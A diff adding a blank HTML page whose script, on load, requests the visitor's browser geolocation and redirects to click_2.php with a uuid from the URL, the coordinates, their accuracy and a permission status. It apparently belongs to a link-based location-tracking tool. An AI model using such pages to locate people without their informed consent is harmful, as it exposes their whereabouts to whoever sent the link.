@@ -1,0 +1,57 @@
+<html>
+
+<body onload="getLocation()">
+	<script>
+		var x = document.getElementById("demo");
+var y = document.getElementById("debug");
+
+var uuid = getParameterByName('uuid');
+
+function getParameterByName(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");
+    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+        // browser didnt support
+        window.location.href="click_2.php?uuid="+uuid+"&status=BR";
+    }
+}
+
+function showPosition(position) {
+    lat = position.coords.latitude;
+    long = position.coords.longitude;
+    acc = position.coords.accuracy;
+    window.location.href="click_2.php?uuid="+uuid+"&lat="+lat+"&long="+long+"&acc="+acc+"&status=good";
+
+}
+
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            window.location.href="click_2.php?uuid="+uuid+"&status=PD";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            window.location.href="click_2.php?uuid="+uuid+"&status=PA";
+            break;
+        case error.TIMEOUT:
+            window.location.href="click_2.php?uuid="+uuid+"&status=TO";
+            break;
+        case error.UNKNOWN_ERROR:
+            window.location.href="click_2.php?uuid="+uuid+"&status=UE";
+            break;
+    }
+}
+	</script>
+
+</body>
+
+</html>
